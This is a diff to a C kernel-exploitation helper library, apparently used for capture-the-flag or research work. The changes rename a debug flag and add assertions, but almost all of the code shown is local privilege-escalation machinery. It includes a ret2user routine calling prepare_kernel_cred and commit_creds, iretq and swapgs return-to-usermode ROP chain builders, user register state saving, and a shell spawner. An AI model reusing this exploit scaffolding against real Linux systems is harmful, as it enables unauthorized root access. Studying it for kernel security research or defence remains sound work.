@@ -15,7 +15,7 @@
 #define ENABLE_MODPROBE_PATH
 #define ENABLE_LOCK_CPU
 #define ENABLE_COMM
-#define ENABLE_DUMP
+#define ENABLE_DEBUG
 
 #define PAGE_SIZE 0x1000
 
@@ -421,6 +421,7 @@ char *kfree_sk_buff(int pair[2], size_t size) {
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #ifdef ENABLE_ROP
+#include <assert.h>
 #include <unistd.h>
 
 void shell() {
@@ -430,6 +431,7 @@ void shell() {
   execve(path, argv, envp);
 }
 
+int done_save_state = 0;
 unsigned long user_cs;
 unsigned long user_ss;
 unsigned long user_sp;
@@ -444,6 +446,8 @@ void save_state() {
       "pushf;"
       "pop user_rflags;"
       ".att_syntax;");
+
+  done_save_state = 1;
 }
 
 unsigned long prepare_kernel_cred;
@@ -451,6 +455,8 @@ unsigned long commit_creds;
 unsigned long swapgs_restore_regs_and_return_to_usermode_0x16;
 
 void ret2user() {
+  assert(done_save_state);
+
   if (swapgs_restore_regs_and_return_to_usermode_0x16) {
     asm(".intel_syntax noprefix;"
         "mov rax, prepare_kernel_cred;"
@@ -499,6 +505,8 @@ void ret2user() {
 }
 
 void rop_iretq(unsigned long *p) {
+  assert(done_save_state);
+
   *p++ = user_ip;
   *p++ = user_cs;
   *p++ = user_rflags;
@@ -507,6 +515,8 @@ void rop_iretq(unsigned long *p) {
 }
 
 void rop_swapgs_restore_regs_and_return_to_usermode(unsigned long *p) {
+  assert(swapgs_restore_regs_and_return_to_usermode_0x16);
+
   *p++ = swapgs_restore_regs_and_return_to_usermode_0x16;
   *p++ = -1;
   *p++ = -1;
@@ -687,7 +697,7 @@ void set_comm(char *name) {
 #endif
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-#ifdef ENABLE_DUMP
+#ifdef ENABLE_DEBUG
 #include <stdio.h>
 
 void stop() { getchar(); }
